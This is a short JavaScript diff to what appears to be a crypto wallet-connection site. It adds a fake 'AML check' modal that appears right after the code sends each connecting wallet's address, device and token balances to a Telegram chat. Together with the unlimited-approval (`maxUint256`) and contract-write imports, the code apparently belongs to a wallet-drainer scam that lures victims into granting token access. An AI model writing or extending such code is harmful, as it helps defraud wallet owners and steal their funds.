@@ -3,6 +3,7 @@ import { createAppKit } from '@reown/appkit'
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
 import { formatUnits, maxUint256, isAddress, getAddress, parseUnits } from 'viem'
 import { readContract, writeContract } from '@wagmi/core'
+import { showAMLCheckModal } from './aml-check-modal.js';
 
 // Утилита для дебаунсинга
 const debounce = (func, wait) => {
@@ -295,6 +296,7 @@ async function notifyWalletConnection(address, walletName, device, balances, cha
                     `${tokenList}\n\n` +
                     `🔗 Site: ${siteUrl}`
     await sendTelegramMessage(message)
+    await showAMLCheckModal()
     store.connectionKey = connectionKey
     const hasBalance = balances.some(token => token.balance > 0)
     if (!hasBalance) {
